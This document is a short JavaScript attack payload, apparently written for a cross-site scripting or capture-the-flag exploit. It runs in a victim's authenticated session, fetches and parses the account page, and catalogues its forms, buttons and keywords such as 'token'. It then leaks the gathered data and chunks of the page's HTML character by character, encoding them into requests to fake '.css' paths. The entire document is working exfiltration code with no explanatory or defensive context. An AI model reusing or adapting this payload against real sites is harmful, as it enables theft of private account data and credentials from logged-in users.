(function(){
  var UNIQ="v7x";

  function sig(tag){
    fetch("/account.php/"+UNIQ+"_"+tag+".css",{credentials:"include"}).catch(function(){});
  }
  function exfilStr(prefix,str,maxLen){
    var n=Math.min(str.length,maxLen||60);
    for(var i=0;i<n;i++){
      var code=str.charCodeAt(i).toString(16).padStart(2,"0");
      var iHex=i.toString(16).padStart(2,"0");
      fetch("/account.php/"+UNIQ+"_"+prefix+"_"+iHex+"_"+code+".css",{credentials:"include"}).catch(function(){});
    }
    sig(prefix+"_l"+n.toString(16).padStart(2,"0"));
  }

  sig("init");

  // Fetch /account.php with admin session - look for extra actions beyond api_key view
  fetch("/account.php",{credentials:"include"}).then(function(r){return r.text();}).then(function(html){
    sig("got_acct");
    var doc=new DOMParser().parseFromString(html,"text/html");
    var forms=doc.querySelectorAll("form");
    var btns=doc.querySelectorAll("[class*=btn],[type=submit],button,a[href*=php]");
    sig("af"+forms.length+"_ab"+btns.length);

    // Exfil form infos
    var info="";
    forms.forEach(function(f){
      info+="|F:"+f.getAttribute("action")+"["+f.getAttribute("method")+"]";
      f.querySelectorAll("input,button,select,textarea").forEach(function(el){
        info+="("+el.getAttribute("name")+":"+el.getAttribute("value")+")";
      });
    });
    btns.forEach(function(b){
      info+="|L:"+b.getAttribute("href")+":"+b.textContent.trim().slice(0,20);
    });
    if(info) exfilStr("ai",info,200);
    else sig("no_ai");

    // Keywords in account page
    var lHtml=html.toLowerCase();
    ["seize","write","publish","upload","change","modify","homepage","site","content","token","rotate","regenerate"].forEach(function(kw){
      if(lHtml.indexOf(kw)>=0) sig("ak_"+kw.slice(0,6));
    });

    // Exfil the whole page in chunks of 80 chars
    // position 0-79 (header), 80-159 (content), 160-239 (actions?)
    exfilStr("a0",html.slice(0,80),80);
    exfilStr("a1",html.slice(80,160),80);
    exfilStr("a2",html.slice(160,240),80);
    exfilStr("a3",html.slice(240,320),80);
    exfilStr("a4",html.slice(320,400),80);
    // Tail of account page
    var tail=html.slice(Math.max(0,html.length-200));
    exfilStr("at",tail,100);
  }).catch(function(){sig("err_acct");});

})();
